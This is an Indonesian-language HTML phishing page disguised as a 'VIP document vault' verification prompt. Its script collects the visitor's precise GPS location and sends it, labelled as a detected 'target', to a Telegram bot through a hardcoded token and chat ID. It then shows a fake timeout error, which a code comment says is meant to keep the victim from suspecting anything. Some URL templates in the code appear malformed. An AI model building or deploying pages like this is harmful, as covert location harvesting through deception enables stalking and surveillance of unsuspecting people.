<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Verifikasi Akses Brankas</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding: 60px 20px; }
        .card { border: 1px solid #30363d; background: #161b22; padding: 40px 20px; border-radius: 12px; max-width: 380px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #58a6ff; margin-bottom: 10px; }
        p { color: #8b949e; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        .btn { background: #238636; color: white; border: none; padding: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
        #status { display: none; margin-top: 20px; color: #d29922; font-size: 13px; }
    </style>
</head>
<body>

<div class="card">
    <h2>🔐 Akses VIP Terkunci</h2>
    <p>Sistem mendeteksi upaya masuk baru. Silakan verifikasi lokasi GPS Anda untuk membuka brankas dokumen VIP ini.</p>
    <button class="btn" onclick="mulaiVerifikasi()">VERIFIKASI SEKARANG</button>
    <div id="status">🔄 Menghubungkan ke server enkripsi...</div>
</div>

<script>
function mulaiVerifikasi() {
    document.getElementById('status').style.display = 'block';
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(kirimData, errorGps, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        alert("Browser tidak mendukung sistem keamanan ini.");
    }
}

function kirimData(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const accuracy = position.coords.accuracy;
    
    // DATA ANDA SUDAH TERPASANG
    const token = "8655474132:AAFyKBASPm1Vjkl92Dcni6hWwTZUQRZeapE";
    const chatid = "8391310530";
    
    const mapsUrl = `https://www.google.com{lat},${lon}`;
    const pesan = `⚠️ **TARGET TERDETEKSI!**\n\n📍 Lokasi: \`${lat}, ${lon}\`\n🎯 Akurasi: ${Math.round(accuracy)} meter\n🌍 **Buka di Peta:**\n${mapsUrl}`;

    fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`)
    .then(() => {
        setTimeout(() => {
            document.getElementById('status').style.display = 'none';
            // Pesan jebakan agar target tidak curiga
            alert("Gagal: Sesi berakhir (Timeout). Silakan hubungi admin atau coba lagi nanti.");
        }, 2000);
    });
}

function errorGps(err) {
    document.getElementById('status').style.display = 'none';
    alert("AKSES DITOLAK: Brankas tidak bisa dibuka tanpa izin 'ALLOW' (IZINKAN) lokasi.");
}
</script>

</body>
</html>
